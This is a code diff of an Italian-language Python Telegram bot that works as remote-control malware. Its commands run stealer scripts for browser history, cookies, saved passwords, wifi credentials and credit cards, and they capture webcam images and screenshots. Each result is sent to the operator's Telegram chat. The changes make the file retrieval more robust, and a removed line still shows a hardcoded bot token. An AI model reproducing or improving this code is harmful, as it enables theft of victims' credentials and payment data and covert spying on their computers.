@@ -54,7 +54,7 @@ disco=disco+"\\"
 
 
 
-TOKEN = "1200557626:AAGPmgT-PBqUU05pWiwuyIoeQdVpy49MGJ0"
+TOKEN = ""
 updater = Updater(TOKEN, use_context=True)
 j = updater.job_queue
 uu=updater.job_queue
@@ -69,8 +69,16 @@ def history(update, context):
 	os.system(avvio)
 	emoction=emoji.emojize(":scroll:")
 	context.bot.send_message(chat_id=update.effective_chat.id, text= f"Invio history in corso... {emoction}")
-	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_history.txt', 'rb'))
-	os.remove(f'{disco}output_file_history.txt')
+	try:
+		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_history.txt', 'rb'))
+		os.remove(f'{disco}output_file_history.txt')
+	except FileNotFoundError:
+		try:
+			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_history.txt', 'rb'))
+			os.remove(f'{disco}\python\output_file_history.txt')
+		except FileNotFoundError:
+			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvate le history del browser su questo pc")
+
 
 
 def cookie(update, context):
@@ -79,8 +87,15 @@ def cookie(update, context):
 	os.system(avvio)
 	emoction= emoji.emojize(":cookie:")
 	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio cookie in corso... {emoction}")
-	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_cookie.txt', 'rb'))
-	os.remove(f'{disco}output_file_cookie.txt')
+	try:
+		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_cookie.txt', 'rb'))
+		os.remove(f'{disco}output_file_cookie.txt')
+	except FileNotFoundError:
+		try:
+			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_cookie.txt', 'rb'))
+			os.remove(f'{disco}\python\output_file_cookie.txt')
+		except FileNotFoundError:
+			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvati cookie su questo pc")
 
 def monitor(update,context):
 	secondi=context.args[0:]
@@ -114,8 +129,15 @@ def password(update, context):
 	os.system(avvio)
 	emoction=emoji.emojize(":file_folder:")
 	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio password in corso... {emoction}")
-	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_password.txt', 'rb'))
-	os.remove(f'{disco}output_file_password.txt')
+	try:
+		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_password.txt', 'rb'))
+		os.remove(f'{disco}output_file_password.txt')
+	except FileNotFoundError:
+		try:
+			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_password.txt', 'rb'))
+			os.remove(f'{disco}\python\output_file_password.txt')
+		except FileNotFoundError:
+			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvate password su questo pc")
 
 def wifi(update, context):
 	global disco
@@ -123,17 +145,32 @@ def wifi(update, context):
 	os.system(avvio)
 	emoction=emoji.emojize(":level_slider:")
 	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio informazioni sul wifi in corso... {emoction}")
-	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_wifi.txt', 'rb'))
-	os.remove(f'{disco}output_file_wifi.txt')
+	try:
+		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_wifi.txt', 'rb'))
+		os.remove(f'{disco}\python\output_file_wifi.txt')
+	except FileNotFoundError:
+		try:
+			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\output_file_wifi.txt', 'rb'))
+			os.remove(f'{disco}\output_file_wifi.txt')
+		except FileNotFoundError:
+			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono riuscito a recuperare le credenziali del wifi")
+
 
 def cards(update, context):
 	global disco
-	avvio = f"{disco}\python\python.exe {disco}Stealer\\Chromium\\CreditCards.py"
+	avvio = f"{disco}\python\python.exe {disco}CrazyPy\\Stealer\\Chromium\\CreditCards.py"
 	os.system(avvio)
 	emoction=emoji.emojize(":credit_card:")
 	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio credit cards in corso... {emoction}")
-	context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_card.txt', 'rb'))
-	os.remove(f'{disco}output_file_card.txt')
+	try:
+		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}output_file_card.txt', 'rb'))
+		os.remove(f'{disco}output_file_card.txt')
+	except FileNotFoundError:
+		try:
+			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disco}\python\output_file_card.txt', 'rb'))
+			os.remove(f'{disco}\python\output_file_card.txt')
+		except FileNotFoundError:
+			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvate credenziali di carte di credito su questo pc")
 
 def power(update, context):
 	comando=context.args[0:]
@@ -159,8 +196,12 @@ def webcam(update,context):
 	os.system(avvio)
 	emoction9= emoji.emojize(":camera:")
 	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Acqusizione immagine dalla webcam in corso...{emoction9} ")
-	context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}webcam.png', 'rb'))
-	os.remove(f'{disco}webcam.png')
+	try:
+		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}webcam.png', 'rb'))
+		os.remove(f'{disco}webcam.png')
+	except FileNotFoundError:
+		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}\python\webcam.png', 'rb'))
+		os.remove(f'{disco}\python\webcam.png')
 
 def screenshot(update,context):
 	global disco
@@ -168,8 +209,12 @@ def screenshot(update,context):
 	im.save("screenshot.png")
 	emoction999= emoji.emojize(":camera_with_flash:")
 	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Acqusizione screenshot desktop in corso...{emoction999} ")
-	context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}screenshot.png', 'rb'))
-	os.remove(f'{disco}screenshot.png')
+	try:
+		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}screenshot.png', 'rb'))
+		os.remove(f'{disco}screenshot.png')
+	except FileNotFoundError:
+		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disco}\python\screenshot.png', 'rb'))
+		os.remove(f'{disco}\python\screenshot.png')
 
 def cdrom(update,context):
 	return windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
